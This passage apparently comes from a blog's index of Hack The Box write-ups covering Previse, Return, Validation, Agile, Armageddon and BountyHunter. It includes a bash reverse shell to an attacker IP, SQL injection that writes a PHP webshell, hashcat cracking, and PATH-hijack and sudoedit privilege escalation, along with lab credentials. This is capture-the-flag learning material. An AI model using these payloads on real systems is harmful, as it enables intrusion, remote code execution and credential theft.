[--\u0026gt; login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.104/css/] /status.php (Status: 302) [Size: 2966] [--\u0026gt; login.php] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.104/js/] /logout.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /accounts.php (Status: 302) [Size: 3994] [--\u0026gt; login.php] /config.php (Status: 200) [Size: 0] /logs.php (Status: 302) [Size: 0] [--\u0026gt; login.php] Foothold If we check response from / page, we also see other endpoints:\nstatus.php files.php file_logs.php accounts.php So in order to check pages, we can intercept response and change status code to 200 OK\nIf we visit accounts.php, we see that we shouldn\u0026rsquo;t access that page Let\u0026rsquo;s create a user Now we can check other pages We found source files in /files.php logs.php has exec() function call $output = exec(\u0026quot;/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\u0026quot;); If we request data, we have I tried injecting id and other stuff, but had no success But when I tried pinging my attack box, I got connection So now let\u0026rsquo;s get reverse shell delim=comma;bash -c 'bash -i \u0026gt;%26 /dev/tcp/10.10.16.4/6666 0\u0026gt;%261' Upgrade shell with python or script /dev/null -c bash User Enumerate the box Nothing found, except the access to db config.php from source files Let\u0026rsquo;s crack the hash It might take a while hashcat -m 500 hash /usr/share/wordlists/rockyou.txt m4lwhere:ilovecody112235! ssh using the creds Root Enumerate again sudo -l Check the content m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz gzip is used without full path So let\u0026rsquo;s create our script called gzip Modify the PATH and run the script ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/previse/images/previse.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/previse/","summary":"Previse Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.104 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 20:03 BST Nmap scan report for 10.10.11.104 (10.10.11.104) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","execute-after-redirect","source-code","php injection","command-injection","path-hijack","hashcat","sudo"],"title":"[HTB] Machine: Previse"},{"categories":null,"contents":"Return Enumeration nmap └─$ nmap -p- -Pn 10.10.11.108 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 16:41 BST Stats: 0:05:48 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 62.24% done; ETC: 16:50 (0:03:31 remaining) Warning: 10.10.11.108 giving up on port because retransmission cap hit (6). Stats: 0:14:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.03% done; ETC: 16:56 (0:00:09 remaining) Nmap scan report for 10.10.11.108 (10.10.11.108) Host is up (0.12s latency). Not shown: 65483 closed tcp ports (conn-refused), 28 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49679/tcp open unknown 49682/tcp open unknown 49694/tcp open unknown 64731/tcp open unknown └─$ nmap -sC -sV -Pn 10.10.11.108 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:52 BST Nmap scan report for 10.10.11.108 (10.10.11.108) Host is up (0.19s latency). Not shown: 990 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: HTB Printer Admin Panel |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-09 18:11:46Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-08-09T18:12:01 |_ start_date: N/A |_clock-skew: 18m01s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 94.64 seconds smb └─$ smbclient -N -L //10.10.11.108 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available gobuster └─$ gobuster dir -u http://10.10.11.108/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.108/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/10 15:50:19 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.108/images/] /index.php (Status: 200) [Size: 28274] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.108/Images/] /Index.php (Status: 200) [Size: 28274] /settings.php (Status: 200) [Size: 29090] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.108/IMAGES/] /INDEX.php (Status: 200) [Size: 28274] Web Server Foothold/User If we visit http://10.10.11.108/settings.php We have a submit form When we click submit, we see that the ip is the only parameter sent If we try changing ip to our address and listen with nc on port 389, we receive the printer creds return\\svc-printer:1edFg43012!! We have a connection via winrm Root Let\u0026rsquo;s enumerate via winpeas According to winpeas the user is in Server Operator group The group can start and stop services If we follow the post we are successfuly get root We modify the service by changing binary path and restart it to get reverse shell ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/return/images/return.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/return/","summary":"Return Enumeration nmap └─$ nmap -p- -Pn 10.10.11.108 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 16:41 BST Stats: 0:05:48 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 62.24% done; ETC: 16:50 (0:03:31 remaining) Warning: 10.10.11.108 giving up on port because retransmission cap hit (6). Stats: 0:14:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.03% done; ETC: 16:56 (0:00:09 remaining) Nmap scan report for 10.","tags":["HTB","printer","ldap","evil-winrm","server-operators","service","service-hijack","windows-service"],"title":"[HTB] Machine: Return"},{"categories":null,"contents":"Validation Enumeration nmap └─$ nmap -p- -Pn 10.10.11.116 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:09 BST Nmap scan report for 10.10.11.116 (10.10.11.116) Host is up (0.14s latency). Not shown: 65522 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4566/tcp open kwtc 5000/tcp filtered upnp 5001/tcp filtered commplex-link 5002/tcp filtered rfe 5003/tcp filtered filemaker 5004/tcp filtered avt-profile-1 5005/tcp filtered avt-profile-2 5006/tcp filtered wsm-server 5007/tcp filtered wsm-server-ssl 5008/tcp filtered synapsis-edge 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 583.51 seconds └─$ nmap -sC -sV -Pn -p22,80,4566,8080 10.10.11.116 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:23 BST Nmap scan report for 10.10.11.116 (10.10.11.116) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-server-header: Apache/2.4.48 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 4566/tcp open http nginx |_http-title: 403 Forbidden 8080/tcp open http nginx |_http-title: 502 Bad Gateway Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds gobuster └─$ gobuster dir -u http://10.10.11.116/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.116/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/10 17:38:19 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 16088] /account.php (Status: 200) [Size: 16] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.116/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.116/js/] /config.php (Status: 200) [Size: 0] Web Server Foothold/User When we fill in the form, we get the following result Let\u0026rsquo;s start with SQLI No issues with Test123' But when I tried special chars with country params, the backend issued error Looks like second-order SQLI - Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. https://portswigger.net/kb/issues/00100210_sql-injection-second-order https://offensive360.com/second-order-sql-injection-attack/ By the way, we have to use the cookie that\u0026rsquo;s being sent to us to see the error It\u0026rsquo;s md5 hash of the username we registered I played around with different payloads and had success with username=TEST\u0026amp;country=USA' union select 1;-- - The query username=TEST\u0026amp;country=USA' union select user();-- - resulted in Since now we can execute different queries, let\u0026rsquo;s enumerate username=TEST\u0026amp;country=USA' union select database();-- - - registration username=TEST\u0026amp;country=USA' union select column_name from information_schema.columns where table_name = 'registration' - shows username, userhash, country, regtime No entries with password If we execute username=TEST\u0026amp;country=USA' union select privilege_type FROM information_schema.user_privileges where grantee = \u0026quot;'uhc'@'localhost'\u0026quot;;-- -, we have FILE privileges We can create a File https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#mysql-commands Let\u0026rsquo;s test it username=TEST\u0026amp;country=USA' union select \u0026quot;PENTEST!!!\u0026quot; into outfile '/var/www/html/PENTEST.txt';-- - Don\u0026rsquo;t forget to visit account.php with the cookie that was sent back Let\u0026rsquo;s create webshell username=TEST\u0026amp;country=USA' union select \u0026quot;\u0026lt;?php SYSTEM($_REQUEST['cmd']); ?\u0026gt;\u0026quot; into outfile '/var/www/html/cmd.php';-- - Reverse shell I didn\u0026rsquo;t know that there is another way of upgrading shell script /dev/null -c bash The rest is the same Root Enumeration resulted in config.php file Let\u0026rsquo;s try su - Rooted ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/validation/images/validation.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/validation/","summary":"Validation Enumeration nmap └─$ nmap -p- -Pn 10.10.11.116 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:09 BST Nmap scan report for 10.10.11.116 (10.10.11.116) Host is up (0.14s latency). Not shown: 65522 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4566/tcp open kwtc 5000/tcp filtered upnp 5001/tcp filtered commplex-link 5002/tcp filtered rfe 5003/tcp filtered filemaker 5004/tcp filtered avt-profile-1 5005/tcp filtered avt-profile-2 5006/tcp filtered wsm-server 5007/tcp filtered wsm-server-ssl 5008/tcp filtered synapsis-edge 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 583.","tags":["HTB","cookies","sqli injection","second-order-sqli","sqli-file","webshell"],"title":"[HTB] Machine: Validation"},{"categories":null,"contents":"Agile Enumeration nmap └─$ nmap -Pn -p22,80,7352,12249,13006,15172,26869,28151,34525,34972,37863,40486,49272,63692 -sC -sV 10.10.11.203 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 15:31 EDT Nmap scan report for 10.10.11.203 (10.10.11.203) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA) |_ 256 65c1480d88cbb975a02ca5e6377e5106 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://superpass.htb |_http-server-header: nginx/1.18.0 (Ubuntu) 7352/tcp closed swx 12249/tcp closed unknown 13006/tcp closed unknown 15172/tcp closed unknown 26869/tcp closed unknown 28151/tcp closed unknown 34525/tcp closed unknown 34972/tcp closed unknown 37863/tcp closed unknown 40486/tcp closed unknown 49272/tcp closed unknown 63692/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds gobuster └─$ gobuster dir -u http://superpass.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://superpass.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/20 15:33:55 Starting gobuster in directory enumeration mode =============================================================== /download (Status: 302) [Size: 249] [--\u0026gt; /account/login?next=%2Fdownload] /static (Status: 301) [Size: 178] [--\u0026gt; http://superpass.htb/static/] /vault (Status: 302) [Size: 243] [--\u0026gt; /account/login?next=%2Fvault] Web server Foothold I created a user and was redirected to /vault Added a password, saved it and clicked export I intercepted the request in Burp and played with it While playing around with /vault route, the error popped up It indicated the backend tech used: flask and mysql It looks like the debug console is enabled and I tried opening it, but it\u0026rsquo;s protected with pin We know it\u0026rsquo;s a flask application And I finally managed to get an lfi by playing around with payloads I was stuck here for a while I couldn\u0026rsquo;t find anything useful, except config_prod.json file, which was retrieved via from /proc/self/environ mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass But then I remembered about the pin and debug console The following post has all the information we need to crack the pin https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/ So I basically try replicating the steps I started gathering all the data I needed from box using lfi After filling in required info, I ran the script And we have successfully cracked the pin Now let\u0026rsquo;s get rce And we have our foothold User #1 Enumerate the box as usual, but I had mysql creds from before I checked the database and found creds for another user corum:5db7caa1d13cc37c9fc2 Now we can ssh User #2 We have another vhost But it\u0026rsquo;s available locally server { listen 127.0.0.1:80; server_name test.superpass.htb; location /static { alias /app/app-testing/superpass/static; expires 365d; } location / { include uwsgi_params; proxy_pass http://127.0.0.1:5555; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-Protocol $scheme; } } If we check /app, we have app-testing Inside we creds.txt, but it\u0026rsquo;s not readable By the way, linpeas also showed chromedriver running in the process list If we check test_site_interactively.py in /app/app-testing/tests/functional, we can see it uses creds.txt It uses selenium to load the site corum@agile:/app$ ls -l total 24 drwxr-xr-x 5 corum runner 4096 Jan 23 21:50 app drwxr-xr-x 8 runner runner 4096 Jan 25 17:29 app-testing -r--r----- 1 dev_admin www-data 88 Jan 25 00:00 config_prod.json -r--r----- 1 dev_admin runner 99 Jan 25 15:15 config_test.json -rwxr-xr-x 1 root runner 557 Jan 25 17:36 test_and_update.sh drwxrwxr-x 5 root dev_admin 4096 Jan 25 17:21 venv So googling resulted in a nice post Now we need to setup a forwarding And open chrome chrome://inspect and devices page Add new port in via Configure, which will set up a new remote target device localhost:41829 Click inspect And we get our creds: edwards:d07867c6267dcb5df0af ssh as edwards Root Nothing on mysql using creds: mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest But we have sudo rights for sudoedit https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/ We remember a test_and_update.sh in /app directory It had a hint # system-wide source doesn't seem to happen in cron jobs So if we check $PATH, we find that each shell is running with python virtual environment corum@agile:~$ echo $PATH /app/venv/bin:/app/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin edwards@agile:~$ tail -2 /etc/bash.bashrc # all users will want the env associated with this application source /app/venv/bin/activate If we monitor pspy we see that root periodically logs in And each time it will source /app/venv/bin/activate So we can modify a /app/venv/bin/activate via CVE-2023-22809 https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/ And wait for execution ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/agile/images/agile.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/agile/","summary":"Agile Enumeration nmap └─$ nmap -Pn -p22,80,7352,12249,13006,15172,26869,28151,34525,34972,37863,40486,49272,63692 -sC -sV 10.10.11.203 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 15:31 EDT Nmap scan report for 10.10.11.203 (10.10.11.203) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA) |_ 256 65c1480d88cbb975a02ca5e6377e5106 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://superpass.htb |_http-server-header: nginx/1.","tags":["HTB","flask","python","file-read","werkzeug","werkzeug-debug","flask-debug-pin","python-venv","selenium","chrome","chrome-debug","sudoedit","cve-2023-22809"],"title":"[HTB] Machine: Agile"},{"categories":null,"contents":"Armageddon Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.233 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 17:41 BST Nmap scan report for 10.10.10.233 (10.10.10.233) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-generator: Drupal 7 (http://drupal.org) |_http-title: Welcome to Armageddon | Armageddon Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.20 seconds gobuster └─$ gobuster dir -u http://10.10.10.233 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php -no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.233 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] No status: true [+] Timeout: 10s =============================================================== 2023/08/07 18:29:26 Starting gobuster in directory enumeration mode =============================================================== /index.php [Size: 7440] /misc [Size: 233] [--\u0026gt; http://10.10.10.233/misc/] /themes [Size: 235] [--\u0026gt; http://10.10.10.233/themes/] /modules [Size: 236] [--\u0026gt; http://10.10.10.233/modules/] /scripts [Size: 236] [--\u0026gt; http://10.10.10.233/scripts/] /sites [Size: 234] [--\u0026gt; http://10.10.10.233/sites/] /includes [Size: 237] [--\u0026gt; http://10.10.10.233/includes/] /install.php [Size: 3172] /profiles [Size: 237] [--\u0026gt; http://10.10.10.233/profiles/] /update.php [Size: 4057] /README.txt [Size: 5382] /robots.txt [Size: 2189] /cron.php [Size: 7388] /INSTALL.txt [Size: 17995] /LICENSE.txt [Size: 18092] /CHANGELOG.txt [Size: 111613] /xmlrpc.php [Size: 42] /COPYRIGHT.txt [Size: 1481] Web Server We see Drupal 7 Foothold Drupal version and searchsploit We have drupalgeddon3 and drupalgeddon2 Let\u0026rsquo;s start with drupalgeddon2 There is a github post Got reverse shell, but couldn\u0026rsquo;t upgrade the shell User Enumerate users bash-4.2$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash grep -irln \u0026quot;password\u0026quot; . in /var/www/html We see ./sites/default/settings.php drupaluser:CQHEy@9M*m23gBVj Since these are mysql creds, let\u0026rsquo;s check db I have to run db commands from cmd, since I don\u0026rsquo;t have PTY bash-4.2$ mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;show tables;\u0026#39; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;show tables;\u0026#39; Tables_in_drupal actions authmap batch ... users users_roles variable watchdog bash-4.2$ mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;select * from users;\u0026#39; \u0026lt;er -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;select * from users;\u0026#39; uid name pass mail theme signature signature_format created access login status timezone language picture init data 0 NULL 0 0 0 0 NULL 0 NULL 1 brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu filtered_html 1606998756 1607077194 1607076276 1 Europe/London 0 admin@armageddon.eu a:1:{s:7:\u0026#34;overlay\u0026#34;;i:1;} Let\u0026rsquo;s crack the hash with hashcat $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt hashcat -m 7900 hash /usr/share/wordlists/rockyou.txt brucetherealadmin:booboo ssh as brucetherealadmin Root Enumerate sudo rights GTFOBins So I found this post which crafts malicious snap package The payload is from [this] dirtysock poc Let\u0026rsquo;s run sudo according to GTFOBins with our malicious package and get root ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/armageddon/images/armageddon.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/armageddon/","summary":"Armageddon Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.233 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 17:41 BST Nmap scan report for 10.10.10.233 (10.10.10.233) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) | http-robots.","tags":["HTB","drupal","webshell","upload","hashcat","mysql","sudo","snap","snapcraft"],"title":"[HTB] Machine: Armageddon"},{"categories":null,"contents":"BountyHunter Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.100 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 15:22 BST Nmap scan report for 10.10.11.100 (10.10.11.100) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Bounty Hunters |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.17 seconds gobuster └─$ gobuster dir -u http://10.10.11.100/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.100/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/07 15:32:18 Starting gobuster in directory enumeration mode =============================================================== /resources (Status: 301) [Size: 316] [--\u0026gt; http://10.10.11.100/resources/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.100/assets/] /.php (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 25169] /portal.php (Status: 200) [Size: 125] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.100/css/] /db.php (Status: 200) [Size: 0] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.100/js/] Web Server Foothold/User If we visit /portal.php We see that it redirects us to /log_submit.php When we submit report from /log_submit.php, the POST request is sent to /tracker_diRbPr00f314.php the data is base64 encoded xml We can test for XXE And it works Now we can try looking for creds We can load php files and analyse the source code I remembered db.php file from gobuster results Since it\u0026rsquo;s php file we need to wrap php file around filter, or it will return empty Check the post admin:m19RoAU0hP41A1sTsq6K Use creds for ssh There is no admin user, but we have development user The creds work Root Enumerate sudo rights If we check source code We can use eval function by inserting values to ticket Example of ticket development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md # Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **31+410+86** ##Issued: 2021/04/06 #End Ticket We can copy and modify valid ticket add payload between ** The first int should 